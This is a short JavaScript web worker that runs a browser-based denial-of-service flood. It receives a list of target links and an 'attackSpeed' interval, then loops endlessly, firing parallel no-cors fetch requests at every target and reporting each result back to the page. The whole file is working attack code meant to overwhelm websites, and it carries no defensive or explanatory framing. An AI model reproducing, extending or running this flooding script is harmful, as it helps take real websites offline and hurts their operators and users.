onmessage = async event => 
{
    const dataFromStart = event.data;
    await processLinks(dataFromStart.linksChunk, dataFromStart.attackSpeed);
};
  
async function fetchData(url) 
{
    postMessage("try_fetch")
    try
    {
        const request = await fetch(url, {'mode': 'no-cors'});
        if (request.status)
        {
            if(!request.ok)
            {
                throw new Error("Bad HTTP code");
            }
        }
        else
        {
            postMessage("ok");
        }
    }
    catch(err)
    {
        //throw new Error("Error", err);
        postMessage("error");
    }
}

async function processLinks(links, attackSpeed) 
{
    while(true)
    {
        Promise.all(links.map(async link => fetchData(link)));
        await sleepThread(attackSpeed);
    }
}

const sleepThread = (ms) => new Promise((r) => setTimeout(r, ms));